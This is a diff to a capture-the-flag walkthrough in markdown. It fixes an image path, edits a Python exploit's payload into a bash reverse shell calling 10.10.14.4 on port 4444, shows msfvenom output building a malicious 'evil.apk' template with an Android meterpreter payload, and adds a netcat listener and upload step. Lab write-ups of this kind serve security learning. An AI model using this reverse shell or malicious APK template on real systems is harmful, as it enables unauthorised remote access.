@@ -51,7 +51,7 @@ Shellcodes: No Results
 
 Open in browser:
 
-![home](IMG/web/jpg)
+![home](IMG/web/web.jpg)
 
 Send type some "injection" char on search sploits input box and the following message appears "stop hacking me - well hack you back"
 
@@ -145,7 +145,7 @@ Change payload part:
 ```python
 # Change me
 #payload = 'echo "Code execution as $(id)" > /tmp/win'
-payload = 'bash -i >& /dev/tcp/0.10.14.33/4444 0>&1' 
+payload = 'bash \-i \>\& \/dev\/tcp\/10\.10\.14\.4\/4444 0\>\&1'
 ```
 Let's run python script in order to generate apk template:
 
@@ -168,4 +168,14 @@ POSIX file permission and/or symlink attributes detected. These attributes are i
 Do: msfvenom -x /tmp/tmp5fpkc0ot/evil.apk -p android/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o /dev/null
 Files  cp -p /tmp/tmp5fpkc0ot/evil.apk . 
 ```
+
+Open netcat session on our Computer:
+
+```shell
+nc -lnvp 4444
+```
+
+upload evil.apk template:
+![template](IMG/uptemplate.png)
+
 
